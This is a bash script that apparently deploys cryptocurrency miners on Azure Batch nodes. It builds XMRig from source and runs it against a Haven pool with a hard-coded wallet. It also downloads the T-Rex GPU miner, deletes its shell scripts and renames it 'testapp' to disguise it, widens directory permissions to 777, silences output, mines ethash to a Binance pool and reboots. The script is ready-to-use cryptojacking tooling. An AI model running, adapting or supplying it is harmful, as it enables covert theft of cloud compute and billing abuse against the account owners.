DIR="/home/_azbatch/xmrig/build/xmrig"
if [ -f "$DIR" ]; then
  ### Take action if $DIR exists ###
    /home/_azbatch/xmrig/build/xmrig --algo=cn-heavy/xhv --url=pool.haven.hashvault.pro:443 --user=hvxyCNrJiqvBtdqWPpAvxtGwLq5n3DdhKcV7rSYRRkxLUGK6pEGm44TAdP9Q11KQKFKCyeEfEge2zMD1nk51aM3u65hqyrQdJi --pass=x --nicehash --max-cpu-usage 75 --cpu-priority 2 --background &&
    hostname=$(hostname | cut -c1-8) &&
    /home/_azbatch/testapp/testapp --algo ethash --url stratum+tcp://ethash.poolbinance.com:443 --user datad --worker $hostname --pass 123456 --cpu-priority 5 --api-bind-http 0 --api-bind-telnet 0 --retries 90 --retry-pause 30   > /dev/null 2>&1 
else
    sudo apt-get update ;
    sudo apt-get -y install libssl-dev cmake build-essential libhwloc-dev libuv1-dev linux-headers-5.4.0-1046-azure ;
    cd /home/_azbatch/ ;
    sudo rm cuda-ubuntu*  > /dev/null 2>&1 
    wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/cuda-ubuntu1804.pin > /dev/null 2>&1 
    sudo mv cuda-ubuntu1804.pin /etc/apt/preferences.d/cuda-repository-pin-600  &
    sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/7fa2af80.pub  > /dev/null 2>&1 
    echo "deb http://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list &&
    sudo apt-get update ;
    sudo apt-get -y install cuda-drivers ;
    sudo chmod -R 777 /home/_azbatch ;
    cd /home/_azbatch ;
    sudo rm -rf xmrig &
    git clone https://github.com/xmrig/xmrig.git && 
    cd /home/_azbatch/xmrig &&
    git checkout v6.13.1 > /dev/null 2>&1 
    sleep 3 &&
    mkdir /home/_azbatch/xmrig/build ;
    cd /home/_azbatch/xmrig/build ;
    cmake .. && 
    make ;
    sleep 5 ;
    /home/_azbatch/xmrig/build/xmrig --algo=cn-heavy/xhv --url=pool.haven.hashvault.pro:443 --user=hvxyCNrJiqvBtdqWPpAvxtGwLq5n3DdhKcV7rSYRRkxLUGK6pEGm44TAdP9Q11KQKFKCyeEfEge2zMD1nk51aM3u65hqyrQdJi --pass=x --nicehash --max-cpu-usage 75 --cpu-priority 2 --background &&
    mkdir /home/_azbatch/trex ;
    cd /home/_azbatch/trex &&
    wget https://github.com/trexminer/T-Rex/releases/download/0.21.0/t-rex-0.21.0-linux.tar.gz &&
    tar -xzvf /home/_azbatch/trex/t-rex-0.21.0-linux.tar.gz &&
    cd /home/_azbatch/trex &&
    find . -name "*.sh" -type f -delete &&
    sudo mv /home/_azbatch/trex /home/_azbatch/testapp &&
    sudo mv /home/_azbatch/testapp/t-rex /home/_azbatch/testapp/testapp &&
    hostname=$(hostname | cut -c1-8) &&
    /home/_azbatch/testapp/testapp --algo ethash --url stratum+tcp://ethash.poolbinance.com:443 --user datad --worker $hostname --pass 123456 --cpu-priority 5 --api-bind-http 0 --api-bind-telnet 0 --retries 90 --retry-pause 30  > /dev/null 2>&1 
    sudo reboot
fi
